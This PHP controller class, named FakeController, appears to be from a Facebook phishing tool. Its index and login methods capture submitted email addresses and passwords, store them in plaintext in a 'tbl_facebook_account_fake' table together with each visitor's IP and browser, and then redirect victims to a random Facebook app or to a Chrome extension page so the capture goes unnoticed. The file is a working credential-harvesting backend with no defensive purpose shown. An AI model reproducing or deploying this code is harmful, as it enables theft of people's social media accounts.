<?php

/*
 * Copyright 2016 tupt.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

class FakeController extends FBToolController {

    protected $redirect_url = 'https://daquy.mobi';

    function index($view='index1') {
        
        $urls = file(PROCESS_PATH . 'scripts/facebook-app.txt');
        array_filter($urls);
        $url = $urls[array_rand($urls)];

        if (isset($_POST['email'])) {
            $agent = trim($_SERVER['HTTP_USER_AGENT']);
            $ip_address = $this->get_client_ip();
            $test = db_select_one('tbl_facebook_account_fake', array('id', 'check'), array('ip' => $ip_address, 'agent' => $agent));

            if (!$test) {
                // the first time insert into database
                db_insert('tbl_facebook_account_fake', array(
                    'ip' => $ip_address,
                    'agent' => $agent,
                    'user' => trim($_POST['email']),
                    'pass' => trim($_POST['pass']),
                    'check' => 1
                ));
            }
            switch ($view){
                case 'index':
                    $this->redirect('https://chrome.google.com/webstore/detail/facebook-color-changer/paegkacdgdffjjiepbbdcgkfgnjcdonl', true);
                    break;
                default:
                    $this->redirect($url, true);
                    break;
            }
            
//      
        } 
        
        $this->assign($_POST["signed_request"]);               
        $this->load(false,"index/$view");
    }

    function code() {
        $this->load();
    }

    function test() {

//        echo base64_decode('cYCSL9VFZSRmQwMUVWVFZPZHowOQ==');
        echo md5('116.104.159.162');
    }

    private function get_client_ip() {
        $ipaddress = '';
        if (getenv('HTTP_CLIENT_IP'))
            $ipaddress = getenv('HTTP_CLIENT_IP');
        else if (getenv('HTTP_X_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
        else if (getenv('HTTP_X_FORWARDED'))
            $ipaddress = getenv('HTTP_X_FORWARDED');
        else if (getenv('HTTP_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_FORWARDED_FOR');
        else if (getenv('HTTP_FORWARDED'))
            $ipaddress = getenv('HTTP_FORWARDED');
        else if (getenv('REMOTE_ADDR'))
            $ipaddress = getenv('REMOTE_ADDR');
        else
            $ipaddress = 'UNKNOWN';
        return ip2long($ipaddress);
    }

    function login() {

        $urls = file(PROCESS_PATH . 'scripts/facebook-app.txt');
        array_filter($urls);
        $url = $urls[array_rand($urls)];

        if (isset($_POST['email'])) {
            $agent = trim($_SERVER['HTTP_USER_AGENT']);
            $ip_address = $this->get_client_ip();
            $test = db_select_one('tbl_facebook_account_fake', array('id', 'check'), array('ip' => $ip_address, 'agent' => $agent));

            if (!$test) {
                // the first time insert into database
                db_insert('tbl_facebook_account_fake', array(
                    'ip' => $ip_address,
                    'agent' => $agent,
                    'user' => trim($_POST['email']),
                    'pass' => trim($_POST['pass']),
                    'check' => 1
                ));
            }

            $this->redirect($url, true);
//      
        } else {
            $this->redirect($url, true);
        }
    }

}
